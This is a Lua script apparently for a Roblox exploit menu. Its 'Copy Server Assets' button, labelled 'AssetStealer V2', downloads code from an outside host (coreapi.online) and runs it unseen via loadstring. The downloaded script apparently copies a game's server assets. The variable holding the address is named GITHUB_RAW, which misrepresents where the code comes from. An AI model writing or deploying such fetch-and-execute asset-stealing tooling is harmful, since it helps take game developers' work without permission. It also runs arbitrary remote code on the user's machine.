repeat task.wait() until _G.WindUI and _G.Tabs and _G.Functions
local WindUI = _G.WindUI
local Tabs = _G.Tabs
local Functions = _G.Functions
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local GITHUB_RAW = "https://coreapi.online/AssetStealer.lua"

Tabs.Custom:Section({
    Title = "Server Assets",
    TextSize = 16,
})

Tabs.Custom:Button({
        Title = "Copy Server Assets",
        Desc = "Copies all server assets.",
        Callback = function()
            WindUI:Notify({ Title = "AssetStealer V2", Content = "Fetching...", Duration = 2 })

            local ok, body = pcall(function()
                if typeof(game.HttpGet) == "function" then
                    return game:HttpGet(GITHUB_RAW)
                else
                    return HttpGetAsync and HttpGetAsync(GITHUB_RAW) or error("HttpGet not available")
                end
            end)

            if not ok or not body or body == "" then
                WindUI:Notify({ Title = "AssetStealer V2", Content = "Download failed", Duration = 4 })
                return
            end

            local compileOk, chunk = pcall(loadstring, body)
            if not compileOk or type(chunk) ~= "function" then
                WindUI:Notify({ Title = "AssetStealer V2", Content = "Load error", Duration = 4 })
                warn("[RemoteRun] loadstring failed:", chunk)
                return
            end

            local runOk, runErr = pcall(chunk)
            if not runOk then
                WindUI:Notify({ Title = "Remote", Content = "Runtime error", Duration = 4 })
                warn("[RemoteRun] runtime error:", runErr)
                return
            end

            WindUI:Notify({
                Title = "AssetStealer V2",
                Content = "Completed.",
                Duration = 3
            })
        end
    })
